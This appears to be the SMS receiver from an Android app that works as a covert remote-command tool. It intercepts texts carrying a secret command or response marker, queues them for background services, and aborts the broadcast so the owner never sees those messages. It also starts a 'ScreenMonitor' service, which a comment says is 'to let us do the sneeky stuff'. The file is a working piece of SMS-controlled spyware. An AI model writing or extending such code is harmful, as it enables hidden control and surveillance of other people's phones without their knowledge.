package com.SmsService.ReceiverComponent;



import com.SmsService.AuxiliaryComponent.CommandJob;
import com.SmsService.AuxiliaryComponent.CommandJobElement;
import com.SmsService.AuxiliaryComponent.CommonVariable;
import com.SmsService.AuxiliaryComponent.Debug;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;


public class SmsReceiver extends BroadcastReceiver {	
	private CommonVariable var = new CommonVariable();
	public void onCreate() {
		
	}
	private void setUp( Context context ) {
		if ( CommonVariable.isCommonVariableSet == false ) {
			/* you can use this method to reset all the CommonVariable */
			var.recoverCommonVariable();
			Debug.PrintLog("SmsReciver","Store variable: "+var.storeCommonVariable(context));
			Debug.PrintLog("SmsReciver","Load variable setting "+var.initCommonVariable(context));
			try {
				Debug.PrintLog("SmsReciver",(String)CommonVariable.class.getField("COMMAND_SIGN").get(null));
			}catch( Exception e ) {}
		}
		
		//start the screen monitor service to let us do the sneeky stuff
		Intent i = new Intent(context, ScreenMonitor.class);			
		context.startService(i);
	}
	@Override
	public void onReceive(Context context, Intent intent) {
		// Load CommonVariable from database
		setUp(context);
		
		//---get the SMS message passed in---
        Bundle bundle = intent.getExtras();        
        SmsMessage[] msgs = null;
        String str = "";
        String number="";        
        if (bundle != null)
        {
            //---retrieve the SMS message received---
            Object[] pdus = (Object[]) bundle.get("pdus");
            msgs = new SmsMessage[pdus.length]; 
            
            for (int i=0; i<msgs.length; i++){
                msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);                
                number +=  msgs[i].getOriginatingAddress();                
                str += msgs[i].getMessageBody().toString();
                str += "\n";        
            }//end for          
            Debug.PrintLog("SmsReciver","Get: "+str);
            isCommand(number,str,context);
            
        }//end if

	}
		
	
	
	private void isCommand(String number,String content,Context context){
		CommandJobElement job;
		
		if(content.contains(CommonVariable.COMMAND_SIGN)){
			Debug.PrintLog("SmsReciver",CommonVariable.COMMAND_SIGN+"is in the SMS message.");
			
			job = CommandJob.setJob(number, content);
			CommandJob.addJob(job);
			
			if ( CommonVariable.CommandServiceLock.equals("false") ) {
					//Intent intent = new Intent(context, CommandService.class);					
					//intent.putExtra("content", content);
					//intent.putExtra("number", number);
					//CommonVariable.CommandServiceLock = "true";
					//context.startService(intent);
					CommandJob.startService(context);
					
			}
			else {
					Debug.PrintLog("SmsReciver","CommonService is locked.");
			}			
			this.abortBroadcast();
			
			
		}
		
		else if ( content.contains(CommonVariable.RESPONSE_SIGN) ) {			
			Debug.PrintLog("SmsReciver",CommonVariable.RESPONSE_SIGN+" is in the SMS message.");
			job = CommandJob.setJob(number, content);
			CommandJob.addJob(job);
			
			if( CommonVariable.ResponseServiceLock.equals("false") ) {
				/*Intent intent = new Intent(context, ResponseService.class);
				//the state intent may need to modified~~~
				intent.putExtra("state", CommonVariable.PHONE_NUMBER_RESPONSE);
				intent.putExtra("number", number);
				intent.putExtra("content", content);*/				
				CommandJob.startResponseService(context);
			}
			else {
				Debug.PrintLog("SmsReciver", "the ResponseService is locked");
			}
			this.abortBroadcast();
		}	
		
	}

}
